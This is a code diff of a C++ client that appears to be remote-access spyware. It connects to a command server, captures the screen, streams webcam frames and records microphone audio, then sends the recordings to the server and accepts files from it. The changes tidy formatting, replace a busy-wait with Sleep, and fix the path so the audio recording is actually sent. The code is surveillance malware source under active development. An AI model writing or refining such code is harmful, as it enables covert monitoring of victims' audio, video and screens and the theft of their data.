@@ -8,7 +8,6 @@
 #include <opencv2\opencv.hpp>
 #include <opencv2\core\core.hpp>
 #include <opencv2\highgui\highgui.hpp>
-#include <SFML/Graphics.hpp>
 #include <SFML/Audio.hpp>
 #include <ctime>
 #include <memory>
@@ -23,27 +22,24 @@
 #pragma comment( lib, "gdiplus" )
 
 
-
 using namespace std;
 using namespace cv;
 using namespace std::experimental::filesystem::v1;
 
-class Client {
-
+class Client
+{
 #ifdef _WIN32
-
 
 
 	string ip;
 	int port;
 public:
-	Client(string ip , int port)
+	Client(string ip, int port)
 	{
 		this->ip = ip;
 		this->port = port;
 	}
 
-	
 
 	void gdiscreen(const wchar_t* avi)
 	{
@@ -150,7 +146,7 @@ public:
 
 	void receive_file_from_server(SOCKET socket, string path)
 	{
-		ofstream file{ path, ofstream::binary };
+		ofstream file{path, ofstream::binary};
 		vector<char> buffer(1025, 0);
 		int size;
 		while (true)
@@ -214,8 +210,8 @@ public:
 			}
 			writer.write(frame);
 			//send(socket, sizeof(reinterpret_cast<const char*>(frame.data), to_string(frame.data));
-			string size = string(frame.begin<unsigned char>(), frame.end<unsigned char>());
 			//string size = (frame.begin<unsigned char>() , frame.end<unsigned char>());
+			string size = string(frame.begin<unsigned char>(), frame.end<unsigned char>());
 			send(socket, to_string(size.size()).c_str(), sizeof(to_string(size.size()).c_str()), 0);
 			send(socket, size.c_str(), size.size(), 0);
 			imshow(windowName, frame); //show the frame in "MyVideo" window
@@ -233,9 +229,7 @@ public:
 		sf::SoundBufferRecorder recorder;
 		time_t currentTime = time(NULL);
 		recorder.start();
-		while (time(NULL) != currentTime + seconds + 1)
-		{
-		}
+		Sleep(seconds * 1000);
 		recorder.stop();
 		const sf::SoundBuffer& buffer = recorder.getBuffer();
 		buffer.saveToFile("C:\\C projects\\mic output.ogg");
@@ -334,7 +328,7 @@ public:
 			{
 				command = command.substr(16, command.size() - 1);
 				capturingAudio(stoi(command));
-				send_file_to_server(sock, "C:\\C project\\mic output.ogg");
+				send_file_to_server(sock, "C:\\C projects\\mic output.ogg");
 			}
 
 
@@ -347,7 +341,7 @@ public:
 
 			else
 			{
-				string problem{ "Cant find the command " + command };
+				string problem{"Cant find the command " + command};
 				send(sock, problem.c_str(), problem.size() + 1, 0);
 			}
 		}
@@ -360,6 +354,6 @@ public:
 
 int main()
 {
-	auto client = new Client("127.0.0.1" , 9999);
+	auto client = new Client("127.0.0.1", 9999);
 	client->client();
 }
